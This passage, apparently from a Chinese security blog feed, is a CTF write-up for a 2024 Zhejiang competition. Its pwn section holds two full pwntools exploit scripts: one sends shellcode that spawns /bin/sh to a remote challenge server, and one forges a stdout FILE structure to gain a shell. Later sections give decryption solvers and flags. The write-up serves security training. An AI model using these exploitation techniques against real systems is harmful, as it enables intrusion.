class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;pop rcx</span><br><span class="hljs-string">xchg rdi,rdx</span><br><span class="hljs-string">sub rcx,0x44</span><br><span class="hljs-string">push rcx</span><br><span class="hljs-string">ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(asm(shellcode)))<br><span class="hljs-comment">#exit()</span><br><span class="hljs-comment">#p=process(&quot;./shellcode&quot;)</span><br>p=remote(<span class="hljs-string">&quot;139.155.126.78&quot;</span>,<span class="hljs-string">&quot;32343&quot;</span>)<br><br><span class="hljs-comment">#gdb.attach(p,&#x27;bp $rebase(0x1424)\nc&#x27;)</span><br>pause()<br>p.send(asm(shellcode))<br><br>pause()<br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    mov rcx,rax</span><br><span class="hljs-string">    add rcx,0x100</span><br><span class="hljs-string">    mov rbx,0x50f</span><br><span class="hljs-string">    mov  word ptr [rcx],bx</span><br><span class="hljs-string">    push 0x68</span><br><span class="hljs-string">    mov rax, 0x732f2f2f6e69622f</span><br><span class="hljs-string">    push rax</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    push 0x1010101 ^ 0x6873</span><br><span class="hljs-string">    xor dword ptr [rsp], 0x1010101</span><br><span class="hljs-string">    xor esi, esi /* 0 */</span><br><span class="hljs-string">    push rsi /* null terminate */</span><br><span class="hljs-string">    push 8</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    add rsi, rsp</span><br><span class="hljs-string">    push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    xor edx, edx /* 0 */</span><br><span class="hljs-string">    push 0x3b</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    jmp rcx</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>p.send(asm(shellcode))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="apple"><a href="#apple" class="headerlink" title="apple"></a>apple</h2><p>存在数组越界可修改stdout的数据，利用io结构体获取shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendafter(<span class="hljs-string">&#x27;choice&#x27;</span>,p32(<span class="hljs-number">1</span>))<br>    p.sendafter(<span class="hljs-string">b&#x27;index&#x27;</span>,p32(ind&amp;<span class="hljs-number">0xffffffff</span>))<br>    p.sendafter(<span class="hljs-string">b&#x27;long?&#x27;</span>,p32(size&amp;<span class="hljs-number">0xffffffff</span>))<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendafter(<span class="hljs-string">&#x27;choice&#x27;</span>,p32(<span class="hljs-number">3</span>))<br>    p.sendafter(<span class="hljs-string">b&#x27;index&#x27;</span>,p32(ind&amp;<span class="hljs-number">0xffffffff</span>))<br>    p.readuntil(<span class="hljs-string">&#x27;&gt;&gt;&gt;\n&#x27;</span>)<br>    <span class="hljs-keyword">return</span> p.readuntil(<span class="hljs-string">&#x27;1.&#x27;</span>,drop=<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">ind</span>):<br>    p.sendafter(<span class="hljs-string">&#x27;choice&#x27;</span>,p32(<span class="hljs-number">2</span>))<br>    p.sendafter(<span class="hljs-string">b&#x27;index&#x27;</span>,p32(ind&amp;<span class="hljs-number">0xffffffff</span>))<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendafter(<span class="hljs-string">&#x27;choice&#x27;</span>,p32(<span class="hljs-number">4</span>))<br>    p.sendafter(<span class="hljs-string">b&#x27;index&#x27;</span>,p32(ind&amp;<span class="hljs-number">0xffffffff</span>))<br><br>    p.sendafter(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,data)<br>    <span class="hljs-keyword">pass</span><br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>d=u64(show(<span class="hljs-number">0</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address=d-<span class="hljs-number">0x21ace0</span><br>fake_io_add=libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>gadget=libc.address+<span class="hljs-number">0xebc88</span><br>wfile_jump=libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>obstack_jump=libc.address+<span class="hljs-number">0x2173c0</span><br>gs=fake_io_add+<span class="hljs-number">0xe0</span><br>shelladd=gs+<span class="hljs-number">0xe8</span><br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>setcontext=libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br><br>shellcode=shellcraft.sh()<br><br><br>obstack=fake_io_add<br>context=fake_io_add+<span class="hljs-number">0xe8</span><br>shelladd=context+<span class="hljs-number">0xe8</span><br>fake_io=flat(&#123;<br>    <span class="hljs-number">0x28</span>: shelladd,<br>    <span class="hljs-number">0x38</span>: setcontext,<br>    <span class="hljs-number">0x48</span>: [context,<span class="hljs-number">1</span>],<br><span class="hljs-number">0xd8</span>: obstack_jump+<span class="hljs-number">0x20</span>,<br>    <span class="hljs-number">0xe0</span>: fake_io_add,<br>&#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>cont=flat(&#123;<br><span class="hljs-number">0x68</span>: obstack&amp;(~<span class="hljs-number">0xfff</span>), <span class="hljs-comment"># rdi</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x1000</span>, <span class="hljs-comment"># rsi</span><br><span class="hljs-number">0x88</span>: <span class="hljs-number">7</span>, <span class="hljs-comment"># rdx</span><br><span class="hljs-number">0xa0</span>: obstack+<span class="hljs-number">0x28</span>, <span class="hljs-comment"># rsp</span><br><span class="hljs-number">0xa8</span>: mprotect, <span class="hljs-comment"># rcx-&gt;rip</span><br><span class="hljs-number">0xe0</span>: obstack<br>&#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>payload=fake_io+cont+asm(shellcode)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">13</span>):<br>    add(i+<span class="hljs-number">2</span>,<span class="hljs-number">0x300</span>)<br>pause()<br>edit(-<span class="hljs-number">8</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="ezRe"><a href="#ezRe" class="headerlink" title="ezRe"></a>ezRe</h2><p>魔改rc4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">rc4</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">toBytes</span>(<span class="hljs-params">self,data</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(data)==<span class="hljs-built_in">str</span>:<br>            <span class="hljs-keyword">return</span> data.encode()<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(data)==<span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-keyword">return</span> data<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;data Type Error&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GetKey</span>(<span class="hljs-params">self,data</span>):<br>        k=[<span class="hljs-number">132</span>, <span class="hljs-number">206</span>, <span class="hljs-number">173</span>, <span class="hljs-number">4</span>, <span class="hljs-number">211</span>, <span class="hljs-number">121</span>, <span class="hljs-number">250</span>, <span class="hljs-number">202</span>, <span class="hljs-number">41</span>, <span class="hljs-number">13</span>, <span class="hljs-number">59</span>, <span class="hljs-number">166</span>, <span class="hljs-number">91</span>, <span class="hljs-number">116</span>, <span class="hljs-number">34</span>, <span class="hljs-number">200</span>, <span class="hljs-number">248</span>, <span class="hljs-number">49</span>, <span class="hljs-number">102</span>, <span class="hljs-number">215</span>, <span class="hljs-number">63</span>, <span class="hljs-number">160</span>, <span class="hljs-number">21</span>, <span class="hljs-number">103</span>, <span class="hljs-number">135</span>, <span class="hljs-number">68</span>, <span class="hljs-number">208</span>, <span class="hljs-number">175</span>, <span class="hljs-number">36</span>, <span class="hljs-number">30</span>, <span class="hljs-number">146</span>, <span class="hljs-number">181</span>, <span class="hljs-number">38</span>, <span class="hljs-number">64</span>, <span class="hljs-number">194</span>, <span class="hljs-number">57</span>, <span class="hljs-number">165</span>, <span class="hljs-number">195</span>, <span class="hljs-number">79</span>, <span class="hljs-number">99</span>, <span class="hljs-number">141</span>, <span class="hljs-number">0</span>, <span class="hljs-number">145</span>, <span class="hljs-number">96</span>, <span class="hljs-number">189</span>, <span class="hljs-number">128</span>, <span class="hljs-number">5</span>, <span class="hljs-number">170</span>, <span class="hljs-number">90</span>, <span class="hljs-number">55</span>, <span class="hljs-number">148</span>, <span class="hljs-number">229</span>, <span class="hljs-number">73</span>, <span class="hljs-number">219</span>, <span class="hljs-number">104</span>, <span class="hljs-number">243</span>, <span class="hljs-number">15</span>, <span class="hljs-number">77</span>, <span class="hljs-number">123</span>, <span class="hljs-number">152</span>, <span class="hljs-number">111</span>, <span class="hljs-number">239</span>, <span class="hljs-number">2</span>, <span class="hljs-number">35</span>, <span class="hljs-number">93</span>, <span class="hljs-number">190</span>, <span class="hljs-number">9</span>, <span class="hljs-number">26</span>, <span class="hljs-number">105</span>, <span class="hljs-number">199</span>, <span class="hljs-number">167</span>, <span class="hljs-number">228</span>, <span class="hljs-number">84</span>, <span class="hljs-number">124</span>, <span class="hljs-number">143</span>, <span class="hljs-number">252</span>, <span class="hljs-number">232</span>, <span class="hljs-number">66</span>, <span class="hljs-number">130</span>, <span class="hljs-number">122</span>, <span class="hljs-number">8</span>, <span class="hljs-number">71</span>, <span class="hljs-number">28</span>, <span class="hljs-number">53</span>, <span class="hljs-number">172</span>, <span class="hljs-number">251</span>, <span class="hljs-number">203</span>, <span class="hljs-number">89</span>, <span class="hljs-number">209</span>, <span class="hljs-number">23</span>, <span class="hljs-number">147</span>, <span class="hljs-number">101</span>, <span class="hljs-number">127</span>, <span class="hljs-number">86</span>, <span class="hljs-number">137</span>, <span class="hljs-number">236</span>, <span class="hljs-number">184</span>, <span class="hljs-number">1</span>, <span class="hljs-number">185</span>, <span class="hljs-number">134</span>, <span class="hljs-number">24</span>, <span class="hljs-number">16</span>, <span class="hljs-number">50</span>, <span class="hljs-number">32</span>, <span class="hljs-number">100</span>, <span class="hljs-number">76</span>, <span class="hljs-number">230</span>, <span class="hljs-number">88</span>, <span class="hljs-number">19</span>, <span class="hljs-number">225</span>, <span class="hljs-number">168</span>, <span class="hljs-number">87</span>, <span class="hljs-number">43</span>, <span class="hljs-number">94</span>, <span class="hljs-number">207</span>, <span class="hljs-number">46</span>, <span class="hljs-number">22</span>, <span class="hljs-number">214</span>, <span class="hljs-number">136</span>, <span class="hljs-number">54</span>, <span class="hljs-number">164</span>, <span class="hljs-number">106</span>, <span class="hljs-number">133</span>, <span class="hljs-number">10</span>, <span class="hljs-number">198</span>, <span class="hljs-number">60</span>, <span class="hljs-number">98</span>, <span class="hljs-number">142</span>, <span class="hljs-number">110</span>, <span class="hljs-number">192</span>, <span class="hljs-number">220</span>, <span class="hljs-number">201</span>, <span class="hljs-number">222</span>, <span class="hljs-number">140</span>, <span class="hljs-number">82</span>, <span class="hljs-number">95</span>, <span class="hljs-number">51</span>, <span class="hljs-number">154</span>, <span class="hljs-number">62</span>, <span class="hljs-number">118</span>, <span class="hljs-number">221</span>, <span class="hljs-number">11</span>, <span class="hljs-number">125</span>, <span class="hljs-number">233</span>, <span class="hljs-number">108</span>, <span class="hljs-number">52</span>, <span class="hljs-number">17</span>, <span class="hljs-number">234</span>, <span class="hljs-number">254</span>, <span class="hljs-number">14</span>, <span class="hljs-number">18</span>, <span class="hljs-number">255</span>, <span class="hljs-number">120</span>, <span class="hljs-number">29</span>, <span class="hljs-number">155</span>, <span class="hljs-number">126</span>, <span class="hljs-number">153</span>, <span class="hljs-number">40</span>, <span class="hljs-number">176</span>, <span class="hljs-number">12</span>, <span class="hljs-number">177</span>, <span class="hljs-number">245</span>, <span class="hljs-number">171</span>, <span class="hljs-number">83</span>, <span class="hljs-number">156</span>, <span class="hljs-number">187</span>, <span class="hljs-number">191</span>, <span class="hljs-number">112</span>, <span class="hljs-number">80</span>, <span class="hljs-number">235</span>, <span class="hljs-number">244</span>, <span class="hljs-number">237</span>, <span class="hljs-number">109</span>, <span class="hljs-number">78</span>, <span class="hljs-number">249</span>, <span class="hljs-number">231</span>, <span class="hljs-number">149</span>, <span class="hljs-number">72</span>, <span class="hljs-number">216</span>, <span class="hljs-number">107</span>, <span class="hljs-number">241</span>, <span class="hljs-number">69</span>, <span class="hljs-number">174</span>, <span class="hljs-number">253</span>, <span class="hljs-number">27</span>, <span class="hljs-number">144</span>, <span class="hljs-number">182</span>, <span class="hljs-number">180</span>, <span class="hljs-number">150</span>, <span class="hljs-number">61</span>, <span class="hljs-number">162</span>, <span class="hljs-number">56</span>, <span class="hljs-number">163</span>, <span class="hljs-number">186</span>, <span class="hljs-number">37</span>, <span class="hljs-number">131</span>, <span class="hljs-number">65</span>, <span class="hljs-number">223</span>, <span class="hljs-number">39</span>, <span class="hljs-number">115</span>, <span class="hljs-number">138</span>, <span class="hljs-number">33</span>, <span class="hljs-number">218</span>, <span class="hljs-number">42</span>, <span class="hljs-number">157</span>, <span class="hljs-number">3</span>, <span class="hljs-number">97</span>, <span class="hljs-number">246</span>, <span class="hljs-number">210</span>, <span class="hljs-number">178</span>, <span class="hljs-number">158</span>, <span class="hljs-number">92</span>, <span class="hljs-number">240</span>, <span class="hljs-number">117</span>, <span class="hljs-number">47</span>, <span class="hljs-number">217</span>, <span class="hljs-number">205</span>, <span class="hljs-number">196</span>, <span class="hljs-number">70</span>, <span class="hljs-number">159</span>, <span class="hljs-number">129</span>, <span class="hljs-number">58</span>, <span class="hljs-number">81</span>, <span class="hljs-number">227</span>, <span class="hljs-number">6</span>, <span class="hljs-number">213</span>, <span class="hljs-number">74</span>, <span class="hljs-number">113</span>, <span class="hljs-number">151</span>, <span class="hljs-number">7</span>, <span class="hljs-number">67</span>, <span class="hljs-number">20</span>, <span class="hljs-number">45</span>, <span class="hljs-number">75</span>, <span class="hljs-number">139</span>, <span class="hljs-number">204</span>, <span class="hljs-number">44</span>, <span class="hljs-number">161</span>, <span class="hljs-number">226</span>, <span class="hljs-number">179</span>, <span class="hljs-number">119</span>, <span class="hljs-number">188</span>, <span class="hljs-number">247</span>, <span class="hljs-number">25</span>, <span class="hljs-number">31</span>, <span class="hljs-number">48</span>, <span class="hljs-number">242</span>, <span class="hljs-number">183</span>, <span class="hljs-number">197</span>, <span class="hljs-number">238</span>, <span class="hljs-number">193</span>, <span class="hljs-number">85</span>, <span class="hljs-number">114</span>, <span class="hljs-number">169</span>, <span class="hljs-number">224</span>, <span class="hljs-number">212</span>]<br>        <span class="hljs-keyword">return</span> k<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Cipher</span>(<span class="hljs-params">self,data</span>):<br>        data=<span class="hljs-variable language_">self</span>.toBytes(data)<br>        enc=[]<br>        k=<span class="hljs-variable language_">self</span>.Key.copy()<br>        n=<span class="hljs-number">0</span><br>        n1=<span class="hljs-number">0</span><br>        tmp=<span class="hljs-number">0</span><br>        key=[]<br>        <span class="hljs-built_in">print</span>(k)<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>            n=(n+<span class="hljs-number">1</span>)&amp;<span class="hljs-number">0xff</span><br>            n1=(n1+k[n])&amp;<span class="hljs-number">0xff</span><br>            tmp=k[n]<br>            k[n]=k[n1]<br>            k[n1]=tmp<br>            key.append(k[(k[n]+k[n1])%<span class="hljs-number">256</span>])<br>        <span class="hljs-built_in">print</span>(key)<br>        <span class="hljs-keyword">for</span> c,k <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(data,key):<br>            enc.append(c^k^<span class="hljs-number">51</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(enc)<br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,key</span>):<br>        key=<span class="hljs-variable language_">self</span>.toBytes(key)<br>        <span class="hljs-variable language_">self</span>.Key=<span class="hljs-variable language_">self</span>.GetKey(key)<br>        <span class="hljs-variable language_">self</span>.__Key=key<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">SetKey</span>(<span class="hljs-params">self,key</span>):<br>        key=<span class="hljs-variable language_">self</span>.toBytes(key)<br>        <span class="hljs-variable language_">self</span>.Key=<span class="hljs-variable language_">self</span>.GetKey(key)<br>        <span class="hljs-variable language_">self</span>.__Key=key<br><br><span class="hljs-keyword">import</span> base64<br>b=base64.b64decode(<span class="hljs-string">&quot;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&quot;</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>b_=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>    b_.append(<span class="hljs-built_in">ord</span>(i))<br>key=<span class="hljs-string">b&quot;7e021a7dd49e4bd0837e22129682551b&quot;</span><br>key_=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key:<br>    key_.append(i^<span class="hljs-number">102</span>)<br>r=rc4(<span class="hljs-built_in">bytes</span>(key_))<br><span class="hljs-built_in">print</span>(r.Cipher(<span class="hljs-built_in">bytes</span>(b_)))<br></code></pre></td></tr></table></figure><h1 id="信创安全"><a href="#信创安全" class="headerlink" title="信创安全"></a>信创安全</h1><h2 id="sm4rev"><a href="#sm4rev" class="headerlink" title="sm4rev"></a>sm4rev</h2><p>将文件在linux中运行一遍</p><p>发现在<code>/tmp</code>目录下生成了一个随机文件<code>xxx</code>开头的文件夹，里面存放了一个二进制程序</p><p>使用<code>find-crypto</code>插件发现是<code>sm4</code>加密，且是<code>ECB</code>模式</p><p>注意端序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">v17 = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>))<br>v17[<span class="hljs-number">0</span>] = <span class="hljs-number">0x01DE4BF77DAD5D82</span>;<br>v17[<span class="hljs-number">1</span>] = <span class="hljs-number">0x4F456C06436A9EDC</span>;<br>v17[<span class="hljs-number">2</span>] = <span class="hljs-number">0x6584914E6D690D85</span>;<br>v17[<span class="hljs-number">3</span>] = <span class="hljs-number">0x2DABC532B0D82242</span>;<br>v17[<span class="hljs-number">4</span>] = <span class="hljs-number">0x3E205B8369A8D383</span>;<br>v17[<span class="hljs-number">5</span>] = <span class="hljs-number">0xBF353724125EBC3A</span>;<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v17:<br>    <span class="hljs-built_in">print</span>(i.to_bytes(<span class="hljs-number">8</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>).<span class="hljs-built_in">hex</span>(),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>密文: <code>825dad7df74bde01dc9e6a43066c454f850d696d4e9184654222d8b032c5ab2d83d3a869835b203e3abc5e12243735bf</code></p><p>密钥: <code>0123456789abcdeffedcba9876543210</code></p><p><code>DASCTF&#123;SM4_is_secure_but_d0nt_t3ll_any0ne!&#125;</code></p><h1 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h1><h2 id="ds-enen"><a href="#ds-enen" class="headerlink" title="ds-enen"></a>ds-enen</h2><p>附加data.vhd没有内容</p><p>foremost分离出一个zip</p><p>数字暴力破解得到密码<code>60111106</code></p><p>打开是一个csv表格，个性签名被加密了，看组成猜测是aes，用密码做为key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> base64<br><br>data = pd.read_csv(<span class="hljs-string">&#x27;data.csv&#x27;</span>)<br>password = data[<span class="hljs-string">&#x27;密码&#x27;</span>]<br>signature = data[<span class="hljs-string">&#x27;个性签名(加密版)&#x27;</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_decrypt</span>(<span class="hljs-params">ciphertext, key</span>):<br>    key = key.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>) + (<span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(key)) * <span class="hljs-string">b&#x27;\0&#x27;</span><br>    ciphertext = base64.b64decode(ciphertext)<br>    cipher = AES.new(key, AES.MODE_ECB)<br>    plaintext = cipher.decrypt(ciphertext)<br>    <span class="hljs-keyword">return</span> plaintext<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(password)):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;DASCTF&#x27;</span> <span class="hljs-keyword">in</span> aes_decrypt(signature[i], password[i]).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(aes_decrypt(signature[i], password[i]).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p><code>DASCTF&#123;dcd85182008e3a2d51b37f9845df3312&#125;</code></p><h2 id="ds-encode"><a href="#ds-encode" class="headerlink" title="ds-encode"></a>ds-encode</h2><p>与 <a href="http://localhost:4000/posts/da856207/#%E5%88%9D%E8%B5%9B-%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8">2024年“羊城杯”粤港澳大湾区网络安全大赛</a> 初赛的数据安全基本一样</p><p>区别是数据源给的不一样，这次是mysql数据库的文件</p><p>将题目给的文件全部复制到mysql中的data文件中即可，注意数据库版本需要是5.7(ib_logfile中可以看到)</p><p><img src="/img/wp/2024/2024-zjss-cs-ds-encode-1.png"></p><p>剩下的就很简单了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h1&gt;&lt;h2 id=&quot;网安知识大挑战&quot;&gt;&lt;a href=&quot;#网安知识大挑战&quot; class=&quot;headerlink&quot; title=&quot;网安知识大挑战&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="2024竞赛" scheme="https://www.dr0n.top/tags/2024%E7%AB%9E%E8%B5%9B/"/>
    
    <category term="浙江" scheme="https://www.dr0n.top/tags/%E6%B5%99%E6%B1%9F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透学习(代理篇)</title>
    <link href="https://www.dr0n.top/posts/52375b43/"/>
    <id>https://www.dr0n.top/posts/52375b43/</id>
    <published>2024-10-10T04:00:00.000Z</published>
    <updated>2025-08-09T13:25:47.015Z</updated>
    
